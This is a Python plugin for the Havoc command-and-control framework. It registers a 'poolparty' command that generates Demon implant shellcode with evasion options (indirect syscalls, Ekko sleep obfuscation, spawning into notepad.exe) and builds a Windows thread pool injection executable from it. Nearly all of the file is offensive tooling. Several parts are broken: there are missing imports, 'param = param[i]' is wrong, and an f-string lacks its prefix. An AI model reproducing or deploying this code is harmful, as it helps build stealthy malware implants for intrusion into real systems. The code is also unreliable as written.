#!/usr/bin/env python
#Author : Cipher007

from havoc import Demon, RegisterCommand, RegisterModule
import os


cwd = os.getcwd()
shellcode_file_path = cwd + "/payload.bin"

def generate_payload(demon, arch, listener):
	demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating shellcode")
	havoc.GeneratePayload(save_shellcode,
            "Demon",
            listener,
            arch,
            "Windows Shellcode",
            "{ \
                \"Amsi/Etw Patch\": \"None\", \
                \"Indirect Syscall\": true,  \
                \"Injection\": { \
                    \"Alloc\": \"Native/Syscall\", \
                    \"Execute\": \"Native/Syscall\", \
                    \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\", \
                    \"Spawn64\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\" \
                }, \
                \"Jitter\": \"15\", \
                \"Proxy Loading\": \"None (LdrLoadDll)\", \
                \"Sleep\": \"2\", \
                \"Sleep Technique\": \"Ekko\", \
                \"Stack Duplication\": true \
            }"
        )
	demon.ConsoleWrite(demon.CONSOLE_INFO, "Saving shellcode to a file")
	demon.ConsoleWrite(demon.CONSOLE_INFO, "Generating PoolParty.exe file with new shellcode")
	os.system("python3 generate.py -f {shellcode_file_path} ")
	demon.ConsoleWrite(demon.CONSOLE_INFO, "PoolParty ready to use!")
	return None

def generate(demonID, *params):
	TaskID : str = None
	demon : Demon = None
	demon = Demon(demonID)

	arch = ""
	listener = ""
	num_params = len(params)
	skip = False
	for i in range(num_params):
		if skip:
			skip = False
			continue

		param = param[i]

		if param == '-a' or param == '--arch':
			skip = True
			if i+1 > num_params:
				demon.ConsoleWrite(demon.CONSOLE_ERROR, 'missing architecture value (x86/x64)')
				return None
			arch = param[i+1]

		elif param == '-l' or param == '--listener':
			skip = True
			if i+1 > num_params:
				demon.ConsoleWrite(demon.CONSOLE_ERROR, 'missing listener name')
				demon.ConsoleWrite(demon.CONSOLE_INFO, 'AVAILABLE LISTENERS : ')
				listeners = havoc.GetListeners()
				for listen in listeners:
					demon.ConsoleWrite(demon.CONSOLE_INFO, f'   {listen}')
			listener = param[i+1]

		elif param == 'help' or param == '-h':
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid Argument: {param}")
			demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE : ")
			demon.ConsoleWrite(demon.CONSOLE_INFO, "poolparty generate -a <x86/x64> -l <listener name>")
			return None

		else:
			demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Invalid Argument: {param}")
			demon.ConsoleWrite(demon.CONSOLE_INFO, "USAGE : ")
			demon.ConsoleWrite(demon.CONSOLE_INFO, "poolparty generate -a <x86/x64> -l <listener name>")
			return None

	demon.ConsoleWrite(demon.CONSOLE_INFO, f"Generating payload for {arch} with listener as {listener}")
	generate_payload(demon, arch, listener)

def save_shellcode(data):
	with open(shellcode_file_path, "wb") as file:
		file.write(b64decode(data))
	file.close()

RegisterModule("poolparty", "Windows Thread Pool Injection Module", "", "", "", "")
RegisterCommand(generate, "poolparty", "generate", "Generate the PoolParty executable",0, "", "")